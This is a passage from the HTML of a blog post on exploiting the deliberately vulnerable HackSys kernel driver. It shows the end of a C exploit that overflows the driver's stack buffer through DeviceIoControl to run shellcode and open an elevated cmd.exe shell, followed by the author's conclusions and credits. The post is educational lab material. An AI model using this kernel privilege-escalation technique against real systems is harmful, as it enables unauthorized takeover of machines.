        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] userBuffer @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">userBuffer</span><span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">userBuffer</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>

    <span class="n">LPVOID</span> <span class="n">payload_ptr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">payload_ptr</span> <span class="o">=</span> <span class="n">userBuffer</span><span class="p">;</span>


    <span class="k">const</span> <span class="kt">size_t</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="n">RET_OFFSET</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">lpInBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>

    <span class="n">RtlFillMemory</span><span class="p">(</span><span class="n">lpInBuffer</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">);</span>

    <span class="n">DWORD</span><span class="o">*</span> <span class="n">address_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">lpInBuffer</span> <span class="o">+</span> <span class="n">RET_OFFSET</span><span class="p">);</span>
    <span class="o">*</span><span class="n">address_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)(</span><span class="n">payload_ptr</span><span class="p">);</span>

    <span class="cm">/*
        BOOL WINAPI DeviceIoControl(
          _In_        HANDLE       hDevice,
          _In_        DWORD        dwIoControlCode,
          _In_opt_    LPVOID       lpInBuffer,
          _In_        DWORD        nInBufferSize,
          _Out_opt_   LPVOID       lpOutBuffer,
          _In_        DWORD        nOutBufferSize,
          _Out_opt_   LPDWORD      lpBytesReturned,
          _Inout_opt_ LPOVERLAPPED lpOverlapped
        );
    */</span>

    <span class="n">DWORD</span> <span class="n">size_returned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">bof</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span>
        <span class="n">driverHandle</span><span class="p">,</span>                       <span class="cm">/* handler for open driver */</span>
        <span class="n">STACK_IOCTL</span><span class="p">,</span>                        <span class="cm">/* IOCTL for the stack overflow */</span>
        <span class="n">lpInBuffer</span><span class="p">,</span>                         <span class="cm">/* our user buffer with shellcode/address_field */</span>
        <span class="n">RET_OFFSET</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">),</span>         <span class="cm">/* want up to the offset + 4 (for the address_field) sent */</span>
        <span class="nb">NULL</span><span class="p">,</span>                               <span class="cm">/* no buffer for the driver to write back to */</span>
        <span class="mi">0</span><span class="p">,</span>                                  <span class="cm">/* above buffer of size 0 */</span>
        <span class="o">&amp;</span><span class="n">size_returned</span><span class="p">,</span>                     <span class="cm">/* dump variable for byte returned */</span>
        <span class="nb">NULL</span><span class="p">);</span>                              <span class="cm">/* ignore overlap */</span>

<span class="cm">/* check if the device IO sent fine! */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bof</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error with DeviceIoControl</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Elevated Shell!</span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">VirtualFree</span><span class="p">(</span><span class="n">userBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
        <span class="n">userBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>


<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Launching Exploit...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exploit</span><span class="p">();</span>

    <span class="cm">/* pop a shell with new privileges! */</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>


    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Exploit launched and driver exploited!</p><p><img data-src="/assets/kernel/elevatedShell.png" alt="TEXTO HOVER" data-proofer-ignore></p><h3 id="conclusions">Conclusions<a href="#conclusions" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>I hope you learned lots about Windows internals, drivers composition and a new technique for elevating privileges like me!</p><p>Exploiting in Kernel can be daunting, and WinDBG may not be the best debugger, but with patient and reading a lot, everything is possible :)</p><p>Special thanks to all these people that were my references for this post:</p><p>HacksysHackSysTeam (https://github.com/hacksysteam)</p><p>Connor McGarr (https://connormcgarr.github.io/)</p><p>Rootkit (https://rootkits.xyz/)</p><p>Hasherezade (https://hshrzd.wordpress.com/)</p><p>Blah Cats (https://blahcat.github.io/)</p><p>Thanks and don’t lose yourself in the kernel!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploiting/'>Exploiting</a>, <a href='/categories/kernel/'>Kernel</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/kernel/" class="post-tag no-text-decoration" >Kernel</a> <a href="/tags/c/" class="post-tag no-text-decoration" >C</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploiting HackSys Kernel driver - Gates of Kernel&url=https://blamethekernel.github.io//posts/Exploiting-HackSys-Kernel-driver/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Exploiting HackSys Kernel driver - Gates of Kernel&u=https://blamethekernel.github.io//posts/Exploiting-HackSys-Kernel-driver/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Exploiting HackSys Kernel driver - Gates of Kernel&url=https://blamethekernel.github.io//posts/Exploiting-HackSys-Kernel-driver/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Exploiting-HackSys-Kernel-driver/">Exploiting HackSys Kernel driver</a><li><a href="/posts/Game-Hacking-CheatEngine/">CheatEngine: Hacking games memory</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/c/">C</a> <a class="post-tag" href="/tags/games/">Games</a> <a class="post-tag" href="/tags/kernel/">Kernel</a> <a class="post-tag" href="/tags/memory/">Memory</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Game-Hacking-CheatEngine/"><div class="card-body"> <em class="timeago small" date="2020-07-10 09:00:00 +0200" >Jul 10, 2020</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CheatEngine: Hacking games memory</h3><div class="text-muted small"><p> Hi all! I like to reverse and crack stuff, and videogames is probably one of the most fun things to hack. Rules are okay but what would have happened if Neo followed the rules?? Exactly, he would ...</p></div></div></a></div><div class="card"> <a href="/posts/IDT/"><div class="card-body"> <em class="timeago small" date="2020-04-22 00:00:00 +0200" >Apr 22, 2020</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reversing Malware</h3><div class="text-muted small"><p> Coming soon</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/IDT/" class="btn btn-outline-primary" prompt="Older"><p>Reversing Malware</p></a> <a href="/posts/Game-Hacking-CheatEngine/" class="btn btn-outline-primary" prompt="Newer"><p>CheatEngine: Hacking games memory</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/blamethekernel">M</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/c/">C</a> <a class="post-tag" href="/tags/games/">Games</a> <a class="post-tag" href="/tags/kernel/">Kernel</a> <a class="post-tag" href="/tags/memory/">Memory</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
